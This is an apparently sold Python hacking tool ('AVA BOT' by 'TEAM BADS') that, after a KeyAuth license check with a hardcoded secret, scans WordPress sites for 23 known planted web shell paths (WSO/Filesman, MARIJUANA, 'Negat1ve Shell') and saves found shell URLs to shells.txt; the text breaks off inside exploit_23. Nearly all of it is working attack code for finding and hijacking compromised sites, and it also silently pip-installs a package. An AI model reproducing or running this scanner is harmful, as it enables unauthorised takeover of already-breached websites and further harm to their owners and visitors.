# -*-coding:Latin-1 -*
import sys , requests, re
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
from pathlib import Path 
import os
os.system("pip install keyauth")
from keyauth import api
import sys
import time
import platform
import os
import hashlib
from time import sleep
from datetime import datetime
import concurrent.futures
if sys.version_info.minor < 10: 
    print("[Security] - Python 3.10 or higher is recommended. The bypass will not work on 3.10+")
    print("You are using Python {}.{}".format(sys.version_info.major, sys.version_info.minor))

if platform.system() == 'Windows':
    os.system('cls & title Python Example')  
elif platform.system() == 'Linux':
    os.system('clear')  
    sys.stdout.write("\x1b]0;Python Example\x07")
elif platform.system() == 'Darwin':
    os.system("clear && printf '\e[3J'")  
    os.system('''echo - n - e "\033]0;Python Example\007"''') 
print("Initializing....")
def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest
keyauthapp = api(
    name = "ravi", 
    ownerid = "kIik4ediGG", 
    secret = "7b47d1595972c84c46cfb7d0e834b98065ba5f34d6fe362cbea60b4475ff34d9", 
    version = "1.0",
    hash_to_check = getchecksum()
)
os.system('cls' if os.name == 'nt' else 'clear')
r ="""\033[1;32;40m
    ___ _    _____       ____  ____  ______
   /   | |  / /   |     / __ )/ __ \/_  __/
  / /| | | / / /| |    / __  / / / / / /
 / ___ | |/ / ___ |   / /_/ / /_/ / / /
/_/  |_|___/_/  |_|  /_____/\____/ /_/
                            (Version:1.0)

  Developed By TEAM BADS
                 TG: https://t.me/bads_community
    POWERFUL WP EXPLOIT & POPULAR SHELL FINDER

"""
print(r)
print(f"\033[0;31mCurrent Session Validation Status: {keyauthapp.check()}")
print(f"\033[0;31mBlacklisted? : {keyauthapp.checkblacklist()}")  
def answer():
    try:
        print("""\033[0;32m
1.Login
2.Register
3.Upgrade
4.License Key Only
        """)
        ans = input("\033[1;33mSelect Option: ")
        if ans == "1":
            user = input('Provide username: ')
            password = input('\033[0;31mProvide password: ')
            keyauthapp.login(user, password)
        elif ans == "2":
            user = input('\033[0;31mProvide username: ')
            password = input('\033[0;31mProvide password: ')
            license = input('\033[0;31mProvide License: ')
            keyauthapp.register(user, password, license)
        elif ans == "3":
            user = input('\033[0;31mProvide username: ')
            license = input('\033[0;31mProvide License: ')
            keyauthapp.upgrade(user, license)
        elif ans == "4":
            key = input('\033[0;32mEnter your license: ')
            keyauthapp.license(key)
        else:
            print("\n\033[1;33mNot Valid Option")
            time.sleep(1)
            os.system('cls')
            answer()
    except KeyboardInterrupt:
        os._exit(1)
answer()
'''try:
    if os.path.isfile('auth.json'): #Checking if the auth file exist
        if jsond.load(open("auth.json"))["authusername"] == "": #Checks if the authusername is empty or not
            print("""
1. Login
2. Register
            """)
            ans=input("Select Option: ")  #Skipping auto-login bc auth file is empty
            if ans=="1": 
                user = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license) 
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option") 
                os._exit(1) 
        else:
            try: #2. Auto login
                with open('auth.json', 'r') as f:
                    authfile = jsond.load(f)
                    authuser = authfile.get('authusername')
                    authpass = authfile.get('authpassword')
                    keyauthapp.login(authuser,authpass)
            except Exception as e: #Error stuff
                print(e)
    else: #Creating auth file bc its missing
        try:
            f = open("auth.json", "a") #Writing content
            f.write("""{
    "authusername": "",
    "authpassword": ""
}""")
            f.close()
            print ("""
1. Login
2. Register
            """)#Again skipping auto-login bc the file is empty/missing
            ans=input("Select Option: ") 
            if ans=="1": 
                user = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option") 
                os._exit(1) 
        except Exception as e: #Error stuff
            print(e)
            os._exit(1) 
except Exception as e: #Error stuff
    print(e)
    os._exit(1)'''
print("\nUser data: ")
print("Username: " + keyauthapp.user_data.username)
print("IP address: " + keyauthapp.user_data.ip)
print("Hardware-Id: " + keyauthapp.user_data.hwid)
subs = keyauthapp.user_data.subscriptions  
for i in range(len(subs)):
    sub = subs[i]["subscription"]  
    expiry = datetime.utcfromtimestamp(int(subs[i]["expiry"])).strftime(
        '%Y-%m-%d %H:%M:%S')  
    timeleft = subs[i]["timeleft"] 

    print(f"[{i + 1} / {len(subs)}] | Subscription: {sub} - Expiry: {expiry} - Timeleft: {timeleft}")
onlineUsers = keyauthapp.fetchOnline()
OU = "" 
if onlineUsers is None:
    OU = "No online users"
else:
    for i in range(len(onlineUsers)):
        OU += onlineUsers[i]["credential"] + " "
print("\n" + OU + "\n")
print("Created at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.createdate)).strftime('%Y-%m-%d %H:%M:%S'))
print("Last login at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.lastlogin)).strftime('%Y-%m-%d %H:%M:%S'))
print("Expires at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.expires)).strftime('%Y-%m-%d %H:%M:%S'))
print(f"Current Session Validation Status: {keyauthapp.check()}")
os.system("clear")
init(autoreset=True)
fr  =   Fore.RED
fg  =   Fore.GREEN
os.system('cls' if os.name == 'nt' else 'clear')
print (r)
requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
# try:
#     fileName = input('\033[1;31mSite Lists: ')
#     file = Path(__file__).with_name(fileName)
#     target = [i.strip() for i in file.open('r').readlines()]
# except IndexError:
#     path = str(sys.argv[0]).split('\\')
#     exit('\n\033[1;31m  [!] Enter <' + path[len(path) - 1] + '> <your list.txt>')
# poolAmount = int(input("\033[1;31mThreads: "))

def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def exploit_1(url):
    try:
        #try with http
        url = 'http://'+URLdomain(url)
        check = requests.get(url+'/wp-content/themes/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
        if ('Negat1ve Shell' in check.content.decode("utf-8")):
                print ('[#] Exploit 1 --> ' + url + ' {}[Succefully]'.format(fg))
                open('shells.txt', 'a').write(url + '/wp-content/themes/ccx/index.php\n')
        #try with https
        else:
            url = 'https://' + URLdomain(url)
            
            check = requests.get(url+'/wp-content/themes/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Negat1ve Shell' in check.content.decode("utf-8"):
                    print ('[#] Exploit 1 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/themes/ccx/index.php\n')
            else:
                print ('[#] Exploit 1 --> ' + url + ' {}[Failed]'.format(fr))
            
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
        
        
        
        
def exploit_2(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/sid/sidwso.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 2 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/sid/sidwso.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/sid/sidwso.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 2 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/sid/sidwso.php\n')
            else:
                print ('[#] Exploit 2 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_3(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 3 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 3 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
            else:
                print ('[#] Exploit 3 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_4(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 4 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 4 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
            else:
                print ('Exploit 4 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_5(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/images/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('[#] Exploit 5 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/images/mar.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/images/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 5 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/images/mar.php\n')
            else:
                print ('[#] Exploit 5 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_6(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/m4r1ju4n4.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('[#] Exploit 6 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/m4r1ju4n4.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/m4r1ju4n4.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 6 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/m4r1ju4n4.php\n')
            else:
                print ('[#] Exploit 6 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_7(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/colors/coffee/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 7 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/colors/coffee/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 7 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/mari.php\n')
            else:
                print (' Exploit 7 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_8(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/colors/coffee/marijuana.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 8 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/marijuana.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/colors/coffee/marijuana.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 8 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/marijuana.php\n')
            else:
                print ('[#] Exploit 8 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_9(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/colors/maro.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 9 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/css/colors/maro.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/colors/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 9 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/css/colors/maro.php\n')
            else:
                print ('[#] Exploit 9 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_10(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 10 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/css/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 10 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/css/mari.php\n')
            else:
                print ('[#] Exploit 10 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_11(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/owfsmac/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 11 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/mar.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/owfsmac/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 11 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/mar.php\n')
            else:
                print ('[#] Exploit 11 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_12(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/maro.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 12 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/css/maro.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 12 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/css/maro.php\n')
            else:
                print ('[#] Exploit 12 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_13(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/includes/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 13 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/includes/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/includes/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 13 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/includes/mari.php\n')
            else:
                print ('[#] Exploit 13 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_14(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/maint/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 14 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/maint/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/maint/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 14 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/maint/mari.php\n')
            else:
                print ('[#] Exploit 14 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_15(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 15 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 15 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/mari.php\n')
            else:
                print ('[#] Exploit 15 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_16(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 16 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 16 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/mari.php\n')
            else:
                print ('[#] Exploit 16 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_17(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/aryabot/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 17 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/aryabot/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 17 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mari.php\n')
            else:
                print ('[#] Exploit 17 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_18(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/aryabot/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 18 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mar.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/aryabot/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 18 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mar.php\n')
            else:
                print ('[#] Exploit 18 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_19(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/owfsmac/maro.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 19 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/maro.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/owfsmac/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 19 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/maro.php\n')
            else:
                print ('[#] Exploit 19 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_20(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 20 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 20 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/mari.php\n')
            else:
                print ('[#] Exploit 20 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_21(url):
    try:
        # try with http
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/hello.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 21 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/hello.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/hello.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 21 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/hello.php\n')
            else:
                print ('[#] Exploit 21 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_22(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/ccx/index.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Negat1ve Shell' in check.content.decode("utf-8")):
                print (' [#] Exploit 22 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/ccx/index.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Negat1ve Shell' in check.content.decode("utf-8"):
                    print (' [#] Exploit 22 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/ccx/index.php\n')
            else:
                print ('[#] Exploit 22 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_23(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/ccx/index.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Negat1ve Shell' in check.content.decode("utf-8")):
                print (' [#] Exploit 23 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/ccx/index.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
